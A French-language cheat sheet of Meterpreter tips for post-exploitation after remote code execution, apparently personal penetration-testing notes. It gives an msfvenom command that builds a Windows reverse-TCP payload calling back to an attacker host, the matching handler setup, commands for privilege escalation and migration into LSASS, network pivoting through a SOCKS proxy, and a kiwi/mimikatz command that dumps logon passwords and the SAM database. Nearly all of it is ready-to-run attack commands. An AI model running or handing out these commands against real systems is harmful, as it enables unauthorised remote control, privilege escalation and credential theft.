# Meterpreter

> Tips pour utiliser la console meterpreter
>
> Outil de post exploitation lorsque l'on a une RCE.



### 1. Génération d'un payload

```bash
# -p : le payload à changer selon le contexte
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_HOTE> LPORT=<PORT_D_ECOUTE> -f exe -o meterpreter.exe

# Puis upload meterpreter.exe et l'exécuter
```



### 2. Setup d'un handler 

```bash
# ATTENTION : bien mettre le même payload que celui généré avec msfvenom
$ msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP_HOTE>
set LPORT <PORT_D_ECOUTE>
exploit
```



### 3. Utilisation de la console

> Tips et tricks pour utiliser la console meterpreter 

```bash
# voir l'écran de la machine
meterpreter> screenshare

# connaitre son utilisateur
meterpreter> getuid

# afficher les processus (sert à migrer dans un processus plus stable pour avoir un shell stable qui ne se coupe pas)
meterpreter> ps
meterpreter> migrate <PID>

# ouvrir une commande shell puis powershell
meterpreter> shell
shell> powershell

# exécuter un binaire
meterpreter> execute -f <BINAIRE.exe>

# passer NT\Autority System (il faut un compte admin local)
meterpreter> getsystem
meterpreter> migrate <PID_LSASS>

# importer des données de nmap pour lister les machines par services exposés
meterpreter> import nmap/*.xml

# lister les machines ayant le port HTTPS d'ouvert (filtre)
meterpreter> services -p 443 -c proto
```



### 4. Exploits meterpreter utiles

> Liste d'exploits meterpreter utiles en TI

```bash
# Trouver le domaine et l'AD
meterpreter> use windows/gather/enum_domain

# Faire une route avec le réseau (sert à créer un proxy socks entre autre)
meterpreter> use multi/manage/autoroute
# Faire un proxy socks
meterpreter> use server/socks_proxy

# Dump lsass
meterpreter> use kiwi
meterpreter> kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
```

